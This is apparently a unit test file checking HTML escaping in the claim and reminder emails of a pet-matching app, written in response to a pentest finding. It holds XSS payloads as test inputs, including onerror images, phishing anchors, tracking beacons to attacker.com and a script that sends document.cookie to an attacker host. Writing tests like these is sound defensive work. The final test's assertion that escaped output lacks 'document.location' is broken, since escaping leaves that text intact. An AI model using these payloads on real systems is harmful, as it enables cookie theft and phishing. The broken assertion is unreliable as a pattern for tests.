// tests/unit/email.test.ts — Unit tests for email HTML injection mitigation

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { sendClaimEmails, sendClaimReminderEmail, escapeHtml } from "@/lib/email";

// Create a mock send function that we can spy on
const mockSend = vi.fn();

// Mock the Resend client
vi.mock("resend", () => {
  return {
    Resend: vi.fn().mockImplementation(() => ({
      emails: {
        send: mockSend,
      },
    })),
  };
});

describe("escapeHtml", () => {
  it("escapes HTML special characters", () => {
    const input = '<script>alert("XSS")</script>';
    const output = escapeHtml(input);
    expect(output).toBe("&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;");
  });

  it("escapes ampersands", () => {
    const input = "Tom & Jerry";
    const output = escapeHtml(input);
    expect(output).toBe("Tom &amp; Jerry");
  });

  it("escapes less-than and greater-than signs", () => {
    const input = "5 < 10 > 3";
    const output = escapeHtml(input);
    expect(output).toBe("5 &lt; 10 &gt; 3");
  });

  it("escapes double quotes", () => {
    const input = 'He said "Hello"';
    const output = escapeHtml(input);
    expect(output).toBe("He said &quot;Hello&quot;");
  });

  it("escapes single quotes", () => {
    const input = "It's a test";
    const output = escapeHtml(input);
    expect(output).toBe("It&#39;s a test");
  });

  it("escapes multiple special characters in sequence", () => {
    const input = '&<>"\'';
    const output = escapeHtml(input);
    expect(output).toBe("&amp;&lt;&gt;&quot;&#39;");
  });

  it("handles empty string", () => {
    const input = "";
    const output = escapeHtml(input);
    expect(output).toBe("");
  });

  it("handles string with no special characters", () => {
    const input = "Normal pet name";
    const output = escapeHtml(input);
    expect(output).toBe("Normal pet name");
  });
});

describe("sendClaimEmails - HTML injection prevention", () => {
  beforeEach(() => {
    mockSend.mockClear();
    mockSend.mockResolvedValue({
      data: { id: "mock-email-id-123" },
      error: null,
    });
    // Set required environment variables
    process.env.RESEND_API_KEY = "test-api-key";
    process.env.NEXT_PUBLIC_APP_URL = "https://meowtrix.io";
  });

  it("escapes HTML tags in pet_name to prevent injection", async () => {
    const maliciousPetName = '<img src=x onerror="alert(1)">';
    
    const results = await sendClaimEmails({
      overlordOwnerEmail: "owner@test.com",
      overlordOwnerName: "Owner Name",
      agentReporterEmail: "reporter@test.com",
      agentReporterName: "Reporter Name",
      petName: maliciousPetName,
      matchId: "match-123",
      matchScore: 95,
    });

    // Verify both emails were sent
    expect(results).toHaveLength(2);
    expect(results[0].status).toBe("sent");
    expect(results[1].status).toBe("sent");

    // Check that the HTML was escaped in both email calls
    expect(mockSend).toHaveBeenCalledTimes(2);
    
    const firstCall = mockSend.mock.calls[0][0];
    const secondCall = mockSend.mock.calls[1][0];

    // Verify the malicious HTML is escaped in the email body
    expect(firstCall.html).toContain("&lt;img src=x onerror=&quot;alert(1)&quot;&gt;");
    expect(firstCall.html).not.toContain('<img src=x onerror="alert(1)">');
    
    expect(secondCall.html).toContain("&lt;img src=x onerror=&quot;alert(1)&quot;&gt;");
    expect(secondCall.html).not.toContain('<img src=x onerror="alert(1)">');

    // Verify the subject line is also escaped
    expect(firstCall.subject).toContain("&lt;img src=x onerror=&quot;alert(1)&quot;&gt;");
    expect(secondCall.subject).toContain("&lt;img src=x onerror=&quot;alert(1)&quot;&gt;");
  });

  it("escapes script tags in pet_name", async () => {
    const maliciousPetName = '<script>alert("XSS")</script>';
    
    const results = await sendClaimEmails({
      overlordOwnerEmail: "owner@test.com",
      overlordOwnerName: "Owner Name",
      agentReporterEmail: "reporter@test.com",
      agentReporterName: "Reporter Name",
      petName: maliciousPetName,
      matchId: "match-123",
      matchScore: 95,
    });

    expect(results).toHaveLength(2);
    expect(results[0].status).toBe("sent");
    expect(results[1].status).toBe("sent");

    const firstCall = mockSend.mock.calls[0][0];
    const secondCall = mockSend.mock.calls[1][0];

    // Verify script tags are escaped
    expect(firstCall.html).toContain("&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;");
    expect(firstCall.html).not.toContain('<script>alert("XSS")</script>');
    
    expect(secondCall.html).toContain("&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;");
    expect(secondCall.html).not.toContain('<script>alert("XSS")</script>');
  });

  it("escapes malicious anchor tags in pet_name", async () => {
    const maliciousPetName = '<a href="http://evil.com">Click me</a>';
    
    const results = await sendClaimEmails({
      overlordOwnerEmail: "owner@test.com",
      overlordOwnerName: "Owner Name",
      agentReporterEmail: "reporter@test.com",
      agentReporterName: "Reporter Name",
      petName: maliciousPetName,
      matchId: "match-123",
      matchScore: 95,
    });

    expect(results).toHaveLength(2);

    const firstCall = mockSend.mock.calls[0][0];
    const secondCall = mockSend.mock.calls[1][0];

    // Verify anchor tags are escaped
    expect(firstCall.html).toContain("&lt;a href=&quot;http://evil.com&quot;&gt;Click me&lt;/a&gt;");
    expect(firstCall.html).not.toContain('<a href="http://evil.com">Click me</a>');
    
    expect(secondCall.html).toContain("&lt;a href=&quot;http://evil.com&quot;&gt;Click me&lt;/a&gt;");
    expect(secondCall.html).not.toContain('<a href="http://evil.com">Click me</a>');
  });

  it("escapes HTML in overlordOwnerName", async () => {
    const maliciousName = '<b>Bold</b><script>alert(1)</script>';
    
    const results = await sendClaimEmails({
      overlordOwnerEmail: "owner@test.com",
      overlordOwnerName: maliciousName,
      agentReporterEmail: "reporter@test.com",
      agentReporterName: "Reporter Name",
      petName: "Fluffy",
      matchId: "match-123",
      matchScore: 95,
    });

    const { Resend } = await import("resend");
    const mockResendInstance = new Resend();
    const mockSend = mockResendInstance.emails.send as ReturnType<typeof vi.fn>;

    expect(results).toHaveLength(2);

    const firstCall = mockSend.mock.calls[0][0];
    const secondCall = mockSend.mock.calls[1][0];

    // Verify the name is escaped in the overlord email
    expect(firstCall.html).toContain("&lt;b&gt;Bold&lt;/b&gt;&lt;script&gt;alert(1)&lt;/script&gt;");
    expect(firstCall.html).not.toContain('<b>Bold</b><script>alert(1)</script>');
    
    // Verify the name is escaped in the agent email (shown as owner's contact)
    expect(secondCall.html).toContain("&lt;b&gt;Bold&lt;/b&gt;&lt;script&gt;alert(1)&lt;/script&gt;");
    expect(secondCall.html).not.toContain('<b>Bold</b><script>alert(1)</script>');
  });

  it("escapes HTML in agentReporterName", async () => {
    const maliciousName = '<iframe src="http://evil.com"></iframe>';
    
    const results = await sendClaimEmails({
      overlordOwnerEmail: "owner@test.com",
      overlordOwnerName: "Owner Name",
      agentReporterEmail: "reporter@test.com",
      agentReporterName: maliciousName,
      petName: "Fluffy",
      matchId: "match-123",
      matchScore: 95,
    });

    const { Resend } = await import("resend");
    const mockResendInstance = new Resend();
    const mockSend = mockResendInstance.emails.send as ReturnType<typeof vi.fn>;

    expect(results).toHaveLength(2);

    const firstCall = mockSend.mock.calls[0][0];
    const secondCall = mockSend.mock.calls[1][0];

    // Verify the name is escaped in the overlord email (shown as finder's contact)
    expect(firstCall.html).toContain("&lt;iframe src=&quot;http://evil.com&quot;&gt;&lt;/iframe&gt;");
    expect(firstCall.html).not.toContain('<iframe src="http://evil.com"></iframe>');
    
    // Verify the name is escaped in the agent email
    expect(secondCall.html).toContain("&lt;iframe src=&quot;http://evil.com&quot;&gt;&lt;/iframe&gt;");
    expect(secondCall.html).not.toContain('<iframe src="http://evil.com"></iframe>');
  });

  it("escapes HTML in email addresses", async () => {
    const maliciousEmail = 'test@test.com"><script>alert(1)</script><a href="';
    
    const results = await sendClaimEmails({
      overlordOwnerEmail: maliciousEmail,
      overlordOwnerName: "Owner Name",
      agentReporterEmail: "reporter@test.com",
      agentReporterName: "Reporter Name",
      petName: "Fluffy",
      matchId: "match-123",
      matchScore: 95,
    });

    const { Resend } = await import("resend");
    const mockResendInstance = new Resend();
    const mockSend = mockResendInstance.emails.send as ReturnType<typeof vi.fn>;

    expect(results).toHaveLength(2);

    const secondCall = mockSend.mock.calls[1][0];

    // Verify the email is escaped when displayed in the agent email
    expect(secondCall.html).toContain("test@test.com&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&quot;");
    expect(secondCall.html).not.toContain('test@test.com"><script>alert(1)</script><a href="');
  });

  it("prevents phishing via fake links in pet_name", async () => {
    // Attacker tries to inject a fake link that looks like the real match URL
    const maliciousPetName = '</strong></p><a href="http://phishing.com">Click here to verify</a><p><strong>';
    
    const results = await sendClaimEmails({
      overlordOwnerEmail: "owner@test.com",
      overlordOwnerName: "Owner Name",
      agentReporterEmail: "reporter@test.com",
      agentReporterName: "Reporter Name",
      petName: maliciousPetName,
      matchId: "match-123",
      matchScore: 95,
    });

    const { Resend } = await import("resend");
    const mockResendInstance = new Resend();
    const mockSend = mockResendInstance.emails.send as ReturnType<typeof vi.fn>;

    expect(results).toHaveLength(2);

    const firstCall = mockSend.mock.calls[0][0];

    // Verify the HTML structure is not broken and the phishing link is escaped
    expect(firstCall.html).not.toContain('<a href="http://phishing.com">');
    expect(firstCall.html).toContain("&lt;/strong&gt;&lt;/p&gt;&lt;a href=&quot;http://phishing.com&quot;&gt;");
  });

  it("prevents style injection in pet_name", async () => {
    const maliciousPetName = '</strong><style>body{display:none}</style><strong>';
    
    const results = await sendClaimEmails({
      overlordOwnerEmail: "owner@test.com",
      overlordOwnerName: "Owner Name",
      agentReporterEmail: "reporter@test.com",
      agentReporterName: "Reporter Name",
      petName: maliciousPetName,
      matchId: "match-123",
      matchScore: 95,
    });

    const { Resend } = await import("resend");
    const mockResendInstance = new Resend();
    const mockSend = mockResendInstance.emails.send as ReturnType<typeof vi.fn>;

    expect(results).toHaveLength(2);

    const firstCall = mockSend.mock.calls[0][0];

    // Verify style tags are escaped
    expect(firstCall.html).not.toContain('<style>body{display:none}</style>');
    expect(firstCall.html).toContain("&lt;style&gt;body{display:none}&lt;/style&gt;");
  });

  it("handles normal pet names without modification", async () => {
    const normalPetName = "Fluffy the Cat";
    
    const results = await sendClaimEmails({
      overlordOwnerEmail: "owner@test.com",
      overlordOwnerName: "John Doe",
      agentReporterEmail: "reporter@test.com",
      agentReporterName: "Jane Smith",
      petName: normalPetName,
      matchId: "match-123",
      matchScore: 95,
    });

    const { Resend } = await import("resend");
    const mockResendInstance = new Resend();
    const mockSend = mockResendInstance.emails.send as ReturnType<typeof vi.fn>;

    expect(results).toHaveLength(2);
    expect(results[0].status).toBe("sent");
    expect(results[1].status).toBe("sent");

    const firstCall = mockSend.mock.calls[0][0];

    // Verify normal names are preserved
    expect(firstCall.html).toContain("Fluffy the Cat");
    expect(firstCall.html).toContain("John Doe");
    expect(firstCall.subject).toContain("Fluffy the Cat");
  });
});

describe("sendClaimReminderEmail - HTML injection prevention", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    process.env.RESEND_API_KEY = "test-api-key";
    process.env.NEXT_PUBLIC_APP_URL = "https://meowtrix.io";
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("escapes HTML in displayName", async () => {
    const maliciousName = '<script>alert("XSS")</script>';
    
    await sendClaimReminderEmail({
      email: "user@test.com",
      displayName: maliciousName,
      petName: "Fluffy",
      matchId: "match-123",
    });

    const { Resend } = await import("resend");
    const mockResendInstance = new Resend();
    const mockSend = mockResendInstance.emails.send as ReturnType<typeof vi.fn>;

    expect(mockSend).toHaveBeenCalledTimes(1);

    const call = mockSend.mock.calls[0][0];

    // Verify the name is escaped
    expect(call.html).toContain("&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;");
    expect(call.html).not.toContain('<script>alert("XSS")</script>');
  });

  it("escapes HTML in petName", async () => {
    const maliciousPetName = '<img src=x onerror=alert(1)>';
    
    await sendClaimReminderEmail({
      email: "user@test.com",
      displayName: "John Doe",
      petName: maliciousPetName,
      matchId: "match-123",
    });

    const { Resend } = await import("resend");
    const mockResendInstance = new Resend();
    const mockSend = mockResendInstance.emails.send as ReturnType<typeof vi.fn>;

    expect(mockSend).toHaveBeenCalledTimes(1);

    const call = mockSend.mock.calls[0][0];

    // Verify the pet name is escaped in both subject and body
    expect(call.subject).toContain("&lt;img src=x onerror=alert(1)&gt;");
    expect(call.subject).not.toContain('<img src=x onerror=alert(1)>');
    
    expect(call.html).toContain("&lt;img src=x onerror=alert(1)&gt;");
    expect(call.html).not.toContain('<img src=x onerror=alert(1)>');
  });

  it("escapes multiple injection attempts in reminder email", async () => {
    const maliciousName = '<b>Bold</b>';
    const maliciousPetName = '<a href="http://evil.com">Click</a>';
    
    await sendClaimReminderEmail({
      email: "user@test.com",
      displayName: maliciousName,
      petName: maliciousPetName,
      matchId: "match-123",
    });

    const { Resend } = await import("resend");
    const mockResendInstance = new Resend();
    const mockSend = mockResendInstance.emails.send as ReturnType<typeof vi.fn>;

    expect(mockSend).toHaveBeenCalledTimes(1);

    const call = mockSend.mock.calls[0][0];

    // Verify both are escaped
    expect(call.html).toContain("&lt;b&gt;Bold&lt;/b&gt;");
    expect(call.html).toContain("&lt;a href=&quot;http://evil.com&quot;&gt;Click&lt;/a&gt;");
    expect(call.html).not.toContain('<b>Bold</b>');
    expect(call.html).not.toContain('<a href="http://evil.com">Click</a>');
  });
});

describe("HTML injection - pentest reproduction scenarios", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    process.env.RESEND_API_KEY = "test-api-key";
    process.env.NEXT_PUBLIC_APP_URL = "https://meowtrix.io";
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("prevents the exact pentest scenario: attacker-controlled pet_name with HTML", async () => {
    // This is the exact attack scenario from the pentest:
    // An attacker creates an overlord with malicious pet_name,
    // then triggers a claim to inject HTML into the email
    const attackPayload = '<img src="http://attacker.com/beacon.gif?victim=owner@test.com">';
    
    const results = await sendClaimEmails({
      overlordOwnerEmail: "owner@test.com",
      overlordOwnerName: "Victim Owner",
      agentReporterEmail: "attacker@test.com",
      agentReporterName: "Attacker",
      petName: attackPayload,
      matchId: "match-123",
      matchScore: 95,
    });

    const { Resend } = await import("resend");
    const mockResendInstance = new Resend();
    const mockSend = mockResendInstance.emails.send as ReturnType<typeof vi.fn>;

    expect(results).toHaveLength(2);
    expect(results[0].status).toBe("sent");
    expect(results[1].status).toBe("sent");

    // Check both emails sent
    expect(mockSend).toHaveBeenCalledTimes(2);

    const overlordEmail = mockSend.mock.calls[0][0];
    const agentEmail = mockSend.mock.calls[1][0];

    // SECURITY ASSERTION: The tracking beacon must be escaped in both emails
    expect(overlordEmail.html).not.toContain('<img src="http://attacker.com/beacon.gif');
    expect(overlordEmail.html).toContain("&lt;img src=&quot;http://attacker.com/beacon.gif");
    
    expect(agentEmail.html).not.toContain('<img src="http://attacker.com/beacon.gif');
    expect(agentEmail.html).toContain("&lt;img src=&quot;http://attacker.com/beacon.gif");

    // SECURITY ASSERTION: No raw HTML tags should be present in the user-controlled content
    const htmlTagPattern = /<img[^>]*src=/i;
    expect(overlordEmail.html.match(htmlTagPattern)).toBeTruthy(); // The legitimate email template has images
    // But the attacker's payload should be escaped
    expect(overlordEmail.html).not.toContain('src="http://attacker.com/beacon.gif');
  });

  it("prevents spoofed message content via HTML injection", async () => {
    // Attacker tries to inject fake message content
    const attackPayload = '</p><p style="color: red; font-size: 20px;">URGENT: Send payment to attacker@evil.com immediately!</p><p>';
    
    const results = await sendClaimEmails({
      overlordOwnerEmail: "owner@test.com",
      overlordOwnerName: "Victim",
      agentReporterEmail: "attacker@test.com",
      agentReporterName: "Attacker",
      petName: attackPayload,
      matchId: "match-123",
      matchScore: 95,
    });

    const { Resend } = await import("resend");
    const mockResendInstance = new Resend();
    const mockSend = mockResendInstance.emails.send as ReturnType<typeof vi.fn>;

    expect(results).toHaveLength(2);

    const overlordEmail = mockSend.mock.calls[0][0];

    // SECURITY ASSERTION: The fake message must be escaped and not rendered as HTML
    expect(overlordEmail.html).not.toContain('<p style="color: red; font-size: 20px;">URGENT:');
    expect(overlordEmail.html).toContain("&lt;/p&gt;&lt;p style=&quot;color: red; font-size: 20px;&quot;&gt;URGENT:");
  });

  it("prevents attacker-controlled links in official emails", async () => {
    // Attacker tries to inject a phishing link
    const attackPayload = 'Fluffy</strong></p><p><a href="http://phishing-site.com/fake-login" style="display: inline-block; background: #FFCC00; color: #0A0A0F; padding: 12px 24px;">Verify Your Account</a></p><p><strong>';
    
    const results = await sendClaimEmails({
      overlordOwnerEmail: "owner@test.com",
      overlordOwnerName: "Victim",
      agentReporterEmail: "attacker@test.com",
      agentReporterName: "Attacker",
      petName: attackPayload,
      matchId: "match-123",
      matchScore: 95,
    });

    const { Resend } = await import("resend");
    const mockResendInstance = new Resend();
    const mockSend = mockResendInstance.emails.send as ReturnType<typeof vi.fn>;

    expect(results).toHaveLength(2);

    const overlordEmail = mockSend.mock.calls[0][0];

    // SECURITY ASSERTION: The phishing link must be escaped
    expect(overlordEmail.html).not.toContain('<a href="http://phishing-site.com/fake-login"');
    expect(overlordEmail.html).toContain("&lt;a href=&quot;http://phishing-site.com/fake-login&quot;");
    
    // SECURITY ASSERTION: The legitimate "View Match Details" button should still be present
    expect(overlordEmail.html).toContain('href="https://meowtrix.io/matches/match-123"');
  });

  it("prevents remote content beacons for tracking", async () => {
    // Attacker tries to inject tracking pixels
    const attackPayload = '<img src="http://attacker.com/track?user=victim" width="1" height="1" />';
    
    const results = await sendClaimEmails({
      overlordOwnerEmail: "owner@test.com",
      overlordOwnerName: "Victim",
      agentReporterEmail: "attacker@test.com",
      agentReporterName: "Attacker",
      petName: attackPayload,
      matchId: "match-123",
      matchScore: 95,
    });

    const { Resend } = await import("resend");
    const mockResendInstance = new Resend();
    const mockSend = mockResendInstance.emails.send as ReturnType<typeof vi.fn>;

    expect(results).toHaveLength(2);

    const overlordEmail = mockSend.mock.calls[0][0];
    const agentEmail = mockSend.mock.calls[1][0];

    // SECURITY ASSERTION: Tracking pixels must be escaped in both emails
    expect(overlordEmail.html).not.toContain('<img src="http://attacker.com/track');
    expect(overlordEmail.html).toContain("&lt;img src=&quot;http://attacker.com/track");
    
    expect(agentEmail.html).not.toContain('<img src="http://attacker.com/track');
    expect(agentEmail.html).toContain("&lt;img src=&quot;http://attacker.com/track");
  });

  it("prevents HTML injection across user boundaries", async () => {
    // This test verifies that the stored HTML injection vulnerability is fixed:
    // 1. Attacker stores malicious pet_name in overlord
    // 2. Claim flow loads that stored value
    // 3. Email is sent to another user (victim)
    // 4. The malicious content must be escaped
    
    const storedMaliciousValue = '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>';
    
    const results = await sendClaimEmails({
      overlordOwnerEmail: "victim@test.com",
      overlordOwnerName: "Innocent Victim",
      agentReporterEmail: "attacker@test.com",
      agentReporterName: "Malicious Attacker",
      petName: storedMaliciousValue, // This simulates the stored value from the database
      matchId: "match-123",
      matchScore: 95,
    });

    const { Resend } = await import("resend");
    const mockResendInstance = new Resend();
    const mockSend = mockResendInstance.emails.send as ReturnType<typeof vi.fn>;

    expect(results).toHaveLength(2);
    expect(results[0].status).toBe("sent");
    expect(results[1].status).toBe("sent");

    const victimEmail = mockSend.mock.calls[0][0];

    // SECURITY ASSERTION: The script tag must be completely escaped
    expect(victimEmail.html).not.toContain('<script>');
    expect(victimEmail.html).not.toContain('document.location');
    expect(victimEmail.html).toContain("&lt;script&gt;");
    expect(victimEmail.html).toContain("&lt;/script&gt;");
    
    // SECURITY ASSERTION: The email subject must also be escaped
    expect(victimEmail.subject).not.toContain('<script>');
    expect(victimEmail.subject).toContain("&lt;script&gt;");
  });
});
